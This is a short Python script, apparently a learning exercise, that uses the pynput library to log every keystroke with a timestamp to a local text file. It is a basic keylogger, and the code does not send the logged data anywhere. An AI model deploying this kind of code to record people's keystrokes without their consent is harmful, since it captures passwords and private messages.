import pynput, time
path='test.txt'

def log(path,key) :
	with open(path,'a') as f :
		try :
			f.write(key.char + '   ' + time.asctime(time.localtime())+'\n')
		except :
			f.write(key.name+ '   '+time.asctime(time.localtime())+'\n')

def on_press(key) :
	global path
	log(path,key)

with pynput.keyboard.Listener(on_press=on_press) as listener:
	listener.join()

listener = pynput.keyboard.Listener(
	on_press=on_press)

listener.start()